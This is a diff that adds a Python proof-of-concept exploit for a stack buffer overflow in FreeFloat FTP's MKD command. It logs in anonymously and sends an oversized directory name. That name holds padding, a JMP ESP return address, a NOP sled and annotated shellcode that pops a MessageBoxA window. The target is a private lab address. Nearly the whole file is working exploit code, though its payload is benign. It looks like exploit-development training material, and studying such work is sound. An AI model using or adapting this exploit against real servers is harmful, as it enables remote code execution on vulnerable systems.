@@ -1,0 +1,66 @@
+#!/usr/bin/python
+
+# FreeFloat FTP (MKD BOF)
+
+import socket
+import struct
+
+HOST = "192.168.88.131"
+PORT = 21
+
+#--------------------------------------------------------------------
+# (*) MessageBoxA                                                   #
+# (*) arwin.exe => User32.dll - MessageBoxA 0x7E4507EA               #
+# (*) MSDN Structure:                                               #
+#                                                                   #
+# int MessageBoxA(          -> PTR to MessageBoxA in User32.dll     #
+#   HWND   hWnd,            -> 0x00000000 (NULL = No owner Windows) #
+#   LPCSTR lpText,          -> "Pop the Box!"                       #
+#   LPCSTR lpCaption,       -> "itsecurityco"                       #
+#   UINT   uType            -> 0x00000000 MB_OK                     #
+# );                                                                #
+#-------------------------------------------------------------------#
+
+MessageBoxA = (
+"\x33\xC0"                  # XOR, EAX,EAX  -> 0x00
+
+"\x50"                      # PUSH EAX      -> Padding for lpCaption
+"\x68\x74\x79\x63\x6F"      # PUSH 7479636F -> "tyco"
+"\x68\x63\x75\x72\x69"      # PUSH 63757269 -> "curi"
+"\x68\x69\x74\x73\x65"      # PUSH 69747365 -> "itse"
+"\x8B\xDC"                  # MOV EBP,ESP   -> PTR to lpCaption
+
+"\x50"                      # PUSH EAX      -> Padding for lpText
+"\x68\x42\x6F\x78\x21"      # PUSH 426F7821 -> "Box!"
+"\x68\x74\x68\x65\x20"      # PUSH 74686520 -> "the "
+"\x68\x50\x6F\x70\x20"      # PUSH 506F7020 -> "Pop "
+"\x8B\xD4"                  # MOV EDX,ESP   -> PTR to lpText
+
+"\x50"                      # PUSH EAX      -> uType = 0x00
+"\x53"                      # PUSH EBX      -> lpCaption
+"\x52"                      # PUSH EDX      -> lpText
+"\x50"                      # PUSH EAX      -> hWnd = 0x00
+
+"\xBF\xEA\x07\x45\x7E"      # MOV EDI,User32.MessageBoxA
+"\xFF\xD7")                 # CALL EDI      -> CALL User32.MessageBoxA()
+
+# ------------------------------------
+# Badchars: \x00\x0A\x0D 
+# 0x71a91c8b : jmp esp | wshtcpip.dll
+# ------------------------------------
+
+jmp_esp = struct.pack("<I", 0x71a91c8b)
+nops = "\x90"*20
+evil = "A"*247 + jmp_esp + nops + MessageBoxA + "C"*(749-len(nops)-len(MessageBoxA))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send('USER anonymous\r\n')
+s.recv(1024)
+s.send('PASS anonymous\r\n')
+s.recv(1024)
+s.send('MKD ' + evil + '\r\n')
+s.recv(1024)
+s.send('QUIT\r\n')
+s.recv(1024)
+s.close()
